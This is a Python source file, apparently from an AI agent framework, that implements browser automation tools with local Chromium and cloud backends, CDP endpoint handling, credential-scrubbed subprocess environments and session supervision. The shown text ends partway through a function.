#!/usr/bin/env python3
"""
Browser Tool Module

This module provides browser automation tools using agent-browser CLI.  It
supports multiple backends — **Browser Use** (cloud, default for Nous
subscribers), **Browserbase** (cloud, direct credentials), and **local
Chromium** — with identical agent-facing behaviour.  The backend is
auto-detected from config and available credentials.

The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
page representation, making it ideal for LLM agents without vision capabilities.

Features:
- **Local mode** (default): zero-cost headless Chromium via agent-browser.
  Works on Linux servers without a display.  One-time setup:
  ``agent-browser install`` (downloads Chromium) or
  ``agent-browser install --with-deps`` (also installs system libraries for
  Debian/Ubuntu/Docker).
- **Cloud mode**: Browserbase or Browser Use cloud execution when configured.
- Session isolation per task ID
- Text-based page snapshots using accessibility tree
- Element interaction via ref selectors (@e1, @e2, etc.)
- Task-aware content extraction using LLM summarization
- Automatic cleanup of browser sessions

Environment Variables:
- BROWSERBASE_API_KEY: API key for direct Browserbase cloud mode
- BROWSERBASE_PROJECT_ID: Project ID for direct Browserbase cloud mode
- BROWSER_USE_API_KEY: API key for direct Browser Use cloud mode
- BROWSERBASE_PROXIES: Enable/disable residential proxies (default: "true")
- BROWSERBASE_ADVANCED_STEALTH: Enable advanced stealth mode with custom Chromium,
  requires Scale Plan (default: "false")
- BROWSERBASE_KEEP_ALIVE: Enable keepAlive for session reconnection after disconnects,
  requires paid plan (default: "true")
- BROWSERBASE_SESSION_TIMEOUT: Custom session timeout in seconds (max 21600 = 6h).
  Set to extend beyond project default. Common values: 600 (10min), 1800 (30min) (default: none)

Usage:
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # Navigate to a page
    result = browser_navigate("https://example.com", task_id="task_123")

    # Get page snapshot
    snapshot = browser_snapshot(task_id="task_123")

    # Click an element
    browser_click("@e5", task_id="task_123")
"""

import atexit
import functools
import json
import logging
import os
import signal
import re
import subprocess
import shutil
import sys
import tempfile
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from enum import Enum
from typing import Dict, Any, Optional, List, Tuple, Union
from pathlib import Path
from agent.redact import redact_cdp_url
from hermes_constants import (
    agent_browser_runnable,
    get_hermes_home,
    get_hermes_home_override,
    hermes_home_key,
    node_tool_runnable,
)
from utils import env_int, is_truthy_value
from hermes_cli.config import DEFAULT_CONFIG, cfg_get
from hermes_cli._subprocess_compat import windows_hide_flags


def __getattr__(name: str):
    """Lazy module attributes (PEP 562) — import diet for cold start.

    ``requests`` (~40 ms) and ``agent.auxiliary_client.call_llm`` (~65 ms)
    are only needed on specific code paths, so they load on first use. The
    module-level names are preserved for the test-patch surface
    (``patch("tools.browser_tool.requests.get")`` /
    ``patch("tools.browser_tool.call_llm")``): first attribute access imports
    the real object and binds it into module globals.
    """
    if name == "requests":
        import requests as _requests

        globals()["requests"] = _requests
        return _requests
    if name == "call_llm":
        from agent.auxiliary_client import call_llm as _call_llm

        globals()["call_llm"] = _call_llm
        return _call_llm
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


def _lazy_call_llm(*args, **kwargs):
    """Invoke ``call_llm`` through module globals so test patches of
    ``tools.browser_tool.call_llm`` are honored, importing lazily otherwise."""
    fn = globals().get("call_llm")
    if fn is None:
        fn = __getattr__("call_llm")
    return fn(*args, **kwargs)

# Browser-specific tool keys passed through to the agent-browser subprocess
# AFTER credential stripping.  agent-browser is a Node process loading npm
# deps; handing it the full operator keyring (#29157 / GHSA-m4m8-xjp4-5rmm)
# means a compromised transitive dependency could read every Hermes secret
# straight out of process.env.  Strip by default, then re-add only the
# browser-backend keys the worker legitimately needs.
_BROWSER_PASSTHROUGH_KEYS: tuple[str, ...] = (
    "BROWSERBASE_API_KEY",
    "BROWSERBASE_PROJECT_ID",
    "BROWSER_USE_API_KEY",
    "FIRECRAWL_API_KEY",
    "FIRECRAWL_API_URL",
    "FIRECRAWL_BROWSER_TTL",
)


def _build_browser_env() -> dict:
    """Credential-scrubbed env for an agent-browser subprocess.

    Strips Hermes-managed secrets (provider keys, gateway tokens, GitHub auth,
    infra secrets) then re-adds only the browser-backend keys the worker needs.
    The ``hermes_subprocess_env`` import is deferred to keep ``browser_tool``
    importable under test harnesses that load it against a stubbed ``tools``
    package (tests/tools/test_managed_browserbase_and_modal.py).
    """
    from tools.environments.local import hermes_subprocess_env

    env = hermes_subprocess_env(inherit_credentials=False)
    for _key in _BROWSER_PASSTHROUGH_KEYS:
        if _key in os.environ:
            env[_key] = os.environ[_key]
    return env

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

try:
    from tools.url_safety import (
        is_safe_url as _is_safe_url,
        is_always_blocked_url as _is_always_blocked_url,
        normalize_url_for_request as _normalize_url_for_request,
        sensitive_query_param_name as _sensitive_query_param_name,
    )
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
    _is_always_blocked_url = lambda url: True  # noqa: E731 — fail-closed on the floor too
    _normalize_url_for_request = lambda url: url  # noqa: E731 — best-effort fallback
    _sensitive_query_param_name = lambda url: None  # noqa: E731 — best-effort fallback
# Browser-provider ABC + registry — PR #25214 moved the per-vendor providers
# (Browserbase / Browser Use / Firecrawl) out of ``tools/browser_providers/``
# and into ``plugins/browser/<vendor>/``. The dispatcher consults the
# registry; the legacy class names are re-exported below as backward-compat
# shims for callers that import them from this module.
from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
    get_provider as _registry_get_browser_provider,
)
try:
    from agent.browser_registry import (
        registry_generation as _browser_registry_generation,
    )
except ImportError:
    # A few isolated compatibility tests intentionally install a minimal
    # ``agent.browser_registry`` stub exposing only ``get_provider``. Those
    # harnesses have no mutable registry, so a constant generation is exact.
    def _browser_registry_generation(*, scope=None):
        return (0, 0)
from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
    BrowserbaseBrowserProvider as BrowserbaseProvider,
)
from plugins.browser.browser_use.provider import (  # noqa: F401
    BrowserUseBrowserProvider as BrowserUseProvider,
)
from plugins.browser.firecrawl.provider import (  # noqa: F401
    FirecrawlBrowserProvider as FirecrawlProvider,
)
from tools.tool_backend_helpers import normalize_browser_cloud_provider
# Camofox local anti-detection browser backend (optional).
# When CAMOFOX_URL is set, all browser operations route through the
# camofox REST API instead of the agent-browser CLI.
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731
# Browser Use CLI (optional)
try:
    from tools.browser_use_cli import is_browser_use_cli_mode as _is_browser_use_cli_mode
except ImportError:
    _is_browser_use_cli_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
# npx, node, and Android's glibc runner (grun).
_SANE_PATH_DIRS = (
    "/data/data/com.termux/files/usr/bin",
    "/data/data/com.termux/files/usr/sbin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).

    When Node is installed via ``brew install node@24`` and NOT linked into
    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
    This function finds those directories so they can be prepended.
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)


def _browser_candidate_path_dirs() -> list[str]:
    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
    hermes_home = get_hermes_home()
    hermes_node_bin = str(hermes_home / "node" / "bin")
    hermes_node_root = str(hermes_home / "node")
    hermes_nm_bin = str(hermes_home / "node_modules" / ".bin")
    return [hermes_node_bin, hermes_node_root, hermes_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)

# Throttle screenshot cleanup to avoid repeated full directory scans.
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# Configuration
# ============================================================================

# Default timeout for browser commands (seconds)
DEFAULT_COMMAND_TIMEOUT = 30

# Floor for ``open`` (navigate) — cold daemon + first Chromium launch can exceed
# the generic command_timeout on slow or library-starved Linux hosts.
MIN_OPEN_TIMEOUT = 60
MIN_FIRST_OPEN_TIMEOUT = 120

# Max chars for snapshot content before truncation/summarization. Aligned
# with web_tools.DEFAULT_EXTRACT_CHAR_LIMIT (15000) — the snapshot and
# web_extract paths share the same truncate-and-store pattern, so the model
# gets the same per-page budget from both.
SNAPSHOT_SUMMARIZE_THRESHOLD = 15000

# Hard ceiling on the full-snapshot file written to cache/web when a snapshot
# is truncated or LLM-summarized. Mirrors web_tools.MAX_STORED_TEXT_CHARS —
# the model only ever sees the truncated view; the stored copy exists for
# read_file paging and must not write unbounded bytes to disk.
MAX_STORED_SNAPSHOT_CHARS = 2_000_000

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: Optional[int] = None
_command_timeout_resolved = False


def _sanitize_url_for_logs(value: object) -> str:
    """Mask secrets in logged browser endpoint URLs and URL-like errors.

    Thin wrapper over :func:`agent.redact.redact_cdp_url`, which is the single
    source of truth for CDP-URL log redaction. Kept as a local name because
    several browser-tool log sites reference it; the redaction policy itself
    lives once in ``redact.py`` so the browser tool and the CDP supervisor
    cannot drift apart.
    """
    return redact_cdp_url(value)


def _get_command_timeout() -> int:
    """Return the configured browser command timeout from config.yaml.

    Reads ``config["browser"]["command_timeout"]`` and falls back to
    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
    cached after the first call and cleared by ``cleanup_all_browsers()``.
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved and _cached_command_timeout is not None:
        return _cached_command_timeout

    result = DEFAULT_COMMAND_TIMEOUT
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    # Assign the cached value BEFORE flipping the resolved flag so a
    # concurrent reader cannot observe ``resolved=True`` while the cache
    # is still ``None`` (see issue #14331).
    _cached_command_timeout = result
    _command_timeout_resolved = True
    return result


def _safe_command_timeout() -> int:
    """Like ``_get_command_timeout`` but guaranteed non-None.

    Defense in depth against the race fixed in ``_get_command_timeout``:
    if anything ever returns ``None`` (e.g. cache reset mid-flight), fall
    back to ``DEFAULT_COMMAND_TIMEOUT``. Uses ``is not None`` rather than
    ``or`` so a legitimately configured ``0`` is preserved.
    """
    val = _get_command_timeout()
    return val if val is not None else DEFAULT_COMMAND_TIMEOUT


def _get_open_command_timeout(*, first_open: bool = False) -> int:
    """Timeout for agent-browser ``open`` (navigation / daemon cold start)."""
    base = _safe_command_timeout()
    floor = MIN_FIRST_OPEN_TIMEOUT if first_open else MIN_OPEN_TIMEOUT
    return max(base, floor)


def _needs_chromium_sandbox_bypass() -> bool:
    """Return True when Chromium needs --no-sandbox to start reliably."""
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    if _running_in_docker():
        return True
    userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    try:
        with open(userns_restrict, encoding="utf-8") as f:
            if f.read().strip() == "1":
                return True
    except OSError:
        pass
    return False


def _read_command_output_files(stdout_path: str, stderr_path: str) -> tuple[str, str]:
    """Best-effort read of agent-browser stdout/stderr temp files."""
    stdout = stderr = ""
    for path, slot in ((stdout_path, "stdout"), (stderr_path, "stderr")):
        try:
            with open(path, "r", encoding="utf-8") as f:
                text = f.read().strip()
        except OSError:
            continue
        if slot == "stdout":
            stdout = text
        else:
            stderr = text
    return stdout, stderr


def _unlink_command_output_files(*paths: str) -> None:
    for path in paths:
        try:
            os.unlink(path)
        except OSError:
            pass


def _format_browser_timeout_error(
    command: str,
    timeout: int,
    stdout: str,
    stderr: str,
) -> str:
    """Build an actionable timeout message from captured daemon output."""
    parts = [f"Command timed out after {timeout} seconds"]
    detail = (stderr or stdout or "").strip()
    if detail:
        parts.append(detail[:1500])

    combined = f"{stderr}\n{stdout}".lower()
    hints: list[str] = []
    if "sandbox" in combined:
        hints.append(
            "Chromium sandbox launch failed. Set AGENT_BROWSER_ARGS="
            "'--no-sandbox,--disable-dev-shm-usage' in your environment, "
            "or run: npx agent-browser install --with-deps"
        )
    elif command == "open" and _is_local_mode():
        if _running_in_docker():
            hints.append(
                "The browser daemon may still be starting or Chromium may be "
                "missing. Pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hints.append(
                "The browser daemon may still be starting, or Chromium may be "
                "missing system libraries. Install/repair with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
    if hints:
        parts.extend(hints)
    return "\n".join(parts)


def _get_vision_model() -> Optional[str]:
    """Model for browser_vision (screenshot analysis — multimodal)."""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _get_extraction_model() -> Optional[str]:
    """Model for page snapshot text summarization — same as web_extract."""
    return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.

    Accepts:
    - full websocket endpoints: ws://host:port/devtools/browser/...
    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
    - bare websocket host:port values like ws://host:port

    For discovery-style endpoints we fetch /json/version and return the
    webSocketDebuggerUrl so downstream tools always receive a concrete browser
    websocket instead of an ambiguous host:port URL.
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        import requests  # lazy — shared module object, test patches still apply

        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning(
            "Failed to resolve CDP endpoint %s via %s: %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(version_url),
            _sanitize_url_for_logs(exc),
        )
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info(
            "Resolved CDP endpoint %s -> %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(ws_url),
        )
        return ws_url

    logger.warning(
        "CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint",
        _sanitize_url_for_logs(version_url),
    )
    return raw


def _get_cdp_override_raw() -> str:
    """Return the *configured* CDP override without any network I/O.

    Precedence is:
    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
    2. ``browser.cdp_url`` in config.yaml (persistent config)

    This is the availability-check variant: callers that only need to know
    *whether* a CDP override is configured (tool ``check_fn`` gates,
    ``_is_local_mode`` / ``_is_local_backend`` routing decisions,
    ``hermes doctor``) MUST use this instead of :func:`_get_cdp_override`.

    Rationale: ``_get_cdp_override`` resolves the endpoint over HTTP
    (``/json/version`` discovery, 10s timeout). Tool-schema assembly runs at
    every CLI/Desktop startup and probes several browser-family check_fns;
    when a *stale* ``browser.cdp_url`` points at a dead endpoint (the debug
    Chrome it referenced is long gone), each check blocked on a failing
    socket connect and startup stalled for 10+ seconds before the banner —
    with no error, just mystery slowness. Same principle as the existing
    "do not execute ``agent-browser --version`` here" rule in
    ``check_browser_requirements``: no side effects during schema build.
    """
    env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
    if env_override:
        return env_override

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return str(browser_cfg.get("cdp_url", "") or "").strip()
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_cdp_override() -> str:
    """Return a normalized CDP URL override, or empty string.

    Precedence is:
    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
    2. ``browser.cdp_url`` in config.yaml (persistent config)

    When either is set, we skip both Browserbase and the local headless
    launcher and connect directly to the supplied Chrome DevTools Protocol
    endpoint.

    NOTE: resolution may perform an HTTP ``/json/version`` discovery request.
    Only call this on paths that are about to *connect* (session creation,
    supervisor attach). Pure is-it-configured gates must use
    :func:`_get_cdp_override_raw`.
    """
    raw = _get_cdp_override_raw()
    if not raw:
        return ""
    return _resolve_cdp_override(raw)


def _get_dialog_policy_config() -> Tuple[str, float]:
    """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.

    Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
    defaults when keys are absent or invalid.
    """
    # Defer imports so browser_tool can be imported in minimal environments.
    from tools.browser_supervisor import (
        DEFAULT_DIALOG_POLICY,
        DEFAULT_DIALOG_TIMEOUT_S,
        _VALID_POLICIES,
    )

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(
    task_id: str,
    target_id: Optional[str] = None,
    *,
    expected_generation: Optional[int] = None,
) -> None:
    """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.

    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
    when a supervisor for this ``(task_id, cdp_url)`` already exists and
    tears down + restarts on URL change. Safe to call on every
    ``browser_navigate`` / ``/browser connect`` without worrying about
    double-attach.

    Resolves the CDP URL in this order:
      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` — covers ``/browser connect``
         and config-set overrides.
      2. ``_active_sessions[task_id]["cdp_url"]`` — covers Browserbase + any
         other cloud provider whose ``create_session`` returns a raw CDP URL.

    A fixed shared-CDP endpoint deliberately waits for ``target_id`` instead
    of adopting its first page. The command path resolves the task-owned
    pinned target before calling again; if pinning never succeeds, supervisor
    features stay unavailable rather than observing another task's page.

    Swallows all errors — failing to attach the supervisor must not break
    the browser session itself.  The agent simply won't see
    ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
    """
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id, {})
        if expected_generation is None:
            raw_generation = session_info.get("_lifecycle_generation")
            if isinstance(raw_generation, int) and not isinstance(raw_generation, bool):
                expected_generation = raw_generation

    cdp_url = _get_cdp_override()
    # A fixed CDP endpoint can already contain unrelated user/task pages. Do
    # not let the supervisor attach to the endpoint's first page before
    # agent-browser has created and pinned this task's own target.
    if cdp_url and target_id is None:
        return
    if not cdp_url:
        # Fallback: active session may carry a per-session CDP URL from a
        # cloud provider (Browserbase sets this).
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        policy, timeout_s = _get_dialog_policy_config()

        def _publication_allowed() -> bool:
            bare_task_id = _bare_task_id_for_session_key(task_id)
            with _cleanup_lock:
                current = _active_sessions.get(task_id)
                if current is None:
                    return False
                if _task_state_locked(bare_task_id) in {
                    BrowserTaskState.RETIRING,
                    BrowserTaskState.RETIRED,
                }:
                    return False
                if expected_generation is None:
                    return True
                return (
                    _task_generation_locked(bare_task_id) == expected_generation
                    and current.get("_lifecycle_generation") == expected_generation
                )

        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            target_id=target_id,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
            publish_guard=_publication_allowed,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


def _pinned_cdp_target_id(task_id: str) -> Optional[str]:
    """Return agent-browser's active pinned page target for ``task_id``."""
    result = _run_browser_command(task_id, "tab", ["list"], timeout=10)
    if not result.get("success"):
        return None
    tabs = result.get("data", {}).get("tabs", [])
    for tab in tabs if isinstance(tabs, list) else []:
        if isinstance(tab, dict) and tab.get("active") and tab.get("type") == "page":
            target_id = str(tab.get("targetId") or "").strip()
            if target_id:
                return target_id
    return None


def _close_shared_cdp_target_confirmed(cdp_url: str, target_id: str) -> bool:
    """Close one shared-CDP target and verify that exact ID disappeared.

    ``agent-browser tab close`` is not authoritative: agent-browser v0.34.0
    removes the target from its own local list before it sends
    ``Target.closeTarget`` and ignores that CDP call's error.  Hermes therefore
    performs the destructive operation at browser level and checks the browser's
    target list before releasing ownership metadata.  A transport or protocol
    error is only accepted when a follow-up target list proves that this exact
    target is gone; otherwise the caller must retain the session for retry.
    """
    target_id = str(target_id or "").strip()
    cdp_url = str(cdp_url or "").strip()
    if not target_id or not cdp_url:
        return False
    try:
        from tools.browser_cdp_tool import _cdp_call, _run_async
    except Exception:
        return False

    def _targets() -> Optional[list[dict[str, Any]]]:
        try:
            result = _run_async(
                _cdp_call(cdp_url, "Target.getTargets", {}, None, 10.0)
            )
            raw = result.get("targetInfos", [])
            return raw if isinstance(raw, list) else None
        except Exception as exc:
            logger.debug("Could not verify shared-CDP target %s: %s", target_id, exc)
            return None

    try:
        _run_async(
            _cdp_call(
                cdp_url,
                "Target.closeTarget",
                {"targetId": target_id},
                None,
                10.0,
            )
        )
    except Exception as exc:
        # The close response may have been lost after Chrome performed the
        # operation.  Exact absence is enough to prove ownership was released;
        # anything else remains ambiguous and must be retried.
        logger.debug("Shared-CDP close for target %s was uncertain: %s", target_id, exc)

    deadline = time.monotonic() + 2.0
    while True:
        targets = _targets()
        if targets is not None:
            if not any(
                isinstance(target, dict) and target.get("targetId") == target_id
                for target in targets
            ):
                return True
            if time.monotonic() >= deadline:
                return False
        elif time.monotonic() >= deadline:
            return False
        time.sleep(0.05)


# ============================================================================
# Cloud Provider Registry
# ============================================================================
#
# Per-vendor browser providers (Browserbase / Browser Use / Firecrawl) live as
# plugins under ``plugins/browser/<vendor>/`` and self-register through
# :mod:`agent.browser_registry` at plugin-discovery time. The legacy
# class-name registry below is preserved as a backward-compat shim so test
# fixtures that ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)``
# keep working — but ``_get_cloud_provider()`` now consults
# :mod:`agent.browser_registry` for the actual lookup.
#
# When the test patches ``_PROVIDER_REGISTRY``, we honour it (so the cache
# unit tests still drive the function); otherwise the registry-backed path
# wins. This keeps the test surface stable while letting third-party
# plugins drop in under ``~/.hermes/plugins/browser/<vendor>/``.

_PROVIDER_REGISTRY: Dict[str, type] = {
    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}
# Frozen copy of the import-time _PROVIDER_REGISTRY, used by
# ``_is_legacy_provider_registry_overridden`` to detect test-time
# monkeypatching. NEVER mutate this dict.
_DEFAULT_PROVIDER_REGISTRY: Dict[str, type] = dict(_PROVIDER_REGISTRY)

_cached_cloud_provider: Optional[CloudBrowserProvider] = None
_cloud_provider_resolved = False
_cached_cloud_provider_scope: Optional[str] = None
_cached_cloud_providers: Dict[
    tuple[str, tuple[int, int]], Optional[CloudBrowserProvider]
] = {}
_cloud_provider_cache_lock = threading.RLock()
_allow_private_urls_resolved = False
_cached_allow_private_urls: Optional[bool] = None
_cached_agent_browser: Optional[str] = None
_agent_browser_resolved = False
_cached_pin_tab_agent_browser: Optional[str] = None
_pin_tab_agent_browser_resolved = False
_pin_tab_failure_cache: Optional[tuple[float, str]] = None

# Lightpanda engine support — cached like _get_cloud_provider().
# agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
_cached_browser_engine: Optional[str] = None
_browser_engine_resolved = False


def _is_legacy_provider_registry_overridden() -> bool:
    """Return True when a test has patched ``_PROVIDER_REGISTRY`` to a custom value.

    Detected by spotting any registered class that *isn't* the canonical
    plugin-backed class for that name. Tests that
    ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)`` install
    custom factories (`exploding_factory`, `lambda: fake_provider`, etc.);
    those entries fail the canonical-class identity check below.

    Note: a future maintainer adding a 4th built-in provider only needs to
    extend ``_DEFAULT_PROVIDER_REGISTRY`` below — they do NOT need to update
    a hardcoded set of keys here. The detection just compares each registered
    value against the corresponding canonical class.
    """
    try:
        for key, default_cls in _DEFAULT_PROVIDER_REGISTRY.items():
            if _PROVIDER_REGISTRY.get(key) is not default_cls:
                return True
        # Extra keys not in the default registry → also an override.
        return len(_PROVIDER_REGISTRY) != len(_DEFAULT_PROVIDER_REGISTRY)
    except Exception:
        return False


def _ensure_browser_plugins_loaded() -> None:
    """Idempotently trigger plugin discovery so the browser registry is populated.

    Normally `model_tools` is imported early in any session and that
    triggers `discover_plugins()` as a side effect. But `_get_cloud_provider`
    can be called from contexts that haven't gone through `model_tools` —
    standalone scripts, certain unit-test paths, the parity-sweep harness.
    Make discovery idempotent and side-effect-only here so users always
    see registered plugins regardless of import order. Cheap: subsequent
    calls early-return inside `_ensure_plugins_discovered`.
    """
    try:
        from hermes_cli.plugins import _ensure_plugins_discovered

        _ensure_plugins_discovered()
    except Exception as exc:
        logger.debug("Browser plugin discovery failed (non-fatal): %s", exc)


def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
    """Return the provider cached for the active Hermes profile."""
    global _cached_cloud_provider, _cloud_provider_resolved
    global _cached_cloud_provider_scope

    scope = hermes_home_key()
    with _cloud_provider_cache_lock:
        # Tests and legacy reset paths clear the boolean. Treat that as a full
        # reset even if a previous scoped resolution remains mirrored here.
        if not _cloud_provider_resolved:
            _cached_cloud_provider_scope = None
            _cached_cloud_providers.clear()
        while True:
            before_generation = _browser_registry_generation(scope=scope)
            cache_key = (scope, before_generation)
            if cache_key in _cached_cloud_providers:
                _cached_cloud_provider = _cached_cloud_providers[cache_key]
                _cloud_provider_resolved = True
                _cached_cloud_provider_scope = scope
                return _cached_cloud_provider

            _cached_cloud_provider = None
            _cloud_provider_resolved = False
            resolved = _resolve_cloud_provider_uncached()
            after_generation = _browser_registry_generation(scope=scope)
            if before_generation != after_generation:
                # A force reload replaced/unloaded this profile's provider
                # while resolution was in progress. Discard the stale result
                # and resolve against the new registry generation.
                continue
            if _cloud_provider_resolved:
                _cached_cloud_provider_scope = scope
                for stale_key in [
                    key for key in _cached_cloud_providers if key[0] == scope
                ]:
                    _cached_cloud_providers.pop(stale_key, None)
                _cached_cloud_providers[cache_key] = resolved
            return resolved


def _resolve_cloud_provider_uncached() -> Optional[CloudBrowserProvider]:
    """Return the configured cloud browser provider, or None for local mode.

    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
    for the process lifetime. An explicit ``local`` provider disables cloud
    fallback. If unset, fall back to Browser Use (managed Nous gateway or
    direct API key) and then Browserbase (direct credentials only) — the
    historic auto-detect order, now expressed as the
    :data:`agent.browser_registry._LEGACY_PREFERENCE` walk.

    Selection routes through :mod:`agent.browser_registry` so third-party
    browser plugins (``~/.hermes/plugins/browser/<vendor>/``) participate
    in explicit-config resolution. Test fixtures that override
    ``_PROVIDER_REGISTRY`` or ``BrowserUseProvider`` / ``BrowserbaseProvider``
    on this module still drive the function — see
    ``_is_legacy_provider_registry_overridden``.
    """
    global _cached_cloud_provider, _cloud_provider_resolved

    resolved: Optional[CloudBrowserProvider] = None
    provider_key = None
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
